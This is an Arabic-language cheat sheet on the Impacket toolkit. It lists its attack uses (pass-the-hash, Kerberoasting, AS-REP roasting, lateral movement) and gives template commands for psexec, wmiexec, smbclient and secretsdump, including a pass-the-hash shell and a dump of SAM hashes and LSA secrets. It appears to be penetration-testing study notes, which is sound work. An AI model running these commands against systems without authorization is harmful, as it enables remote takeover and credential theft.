Impacket عبارة عن:

```
مجموعة أدوات وسكربتات مكتوبة بـ Python
```

تستخدم للتعامل مع:

- SMB
- NTLM
- Kerberos
- LDAP
- MSRPC
- وغيرها من بروتوكولات ويندوز.

# ماذا يقدم؟ 

يوفر:

- Pass-the-Hash
- Remote Execution
- SMB Enumeration
- Kerberos Attacks
- Dump Hashes
- Lateral Movement

# أشهر سكربتات Impacket 

|السكربت|الوظيفة|
|---|---|
|`psexec.py`|تنفيذ أوامر عبر SMB|
|`smbclient.py`|الدخول إلى SMB Shares|
|`wmiexec.py`|تنفيذ أوامر عبر WMI|
|`secretsdump.py`|استخراج Hashes|
|`GetNPUsers.py`|AS-REP Roasting|
|`GetUserSPNs.py`|Kerberoasting|
|`atexec.py`|تنفيذ أوامر عبر Task Scheduler|
|`lookupsid.py`|SID Enumeration|

---
# أشهر سكربت 

ملاحظه بالبداية نكتب impacket-
مثال 

	impacket-psexec command

وهكذا

## psexec.py

```
psexec.py administrator:password@IP
```

يعطيك:

```
Shell على الجهاز
```

# Pass-the-Hash 

```
psexec.py administrator@IP -hashes LMHASH:NTHASH
```

# استخراج Hashes

## secretsdump.py

```
secretsdump.py administrator:pass@IP
```

قد يسحب:

- SAM Hashes
- LSA Secrets
- Cached Credentials

# الدخول إلى SMB Share

## smbclient.py

```
smbclient.py user:pass@IP
```

# تنفيذ أوامر بدون رفع ملف 

## wmiexec.py

```
wmiexec.py administrator:pass@IP
```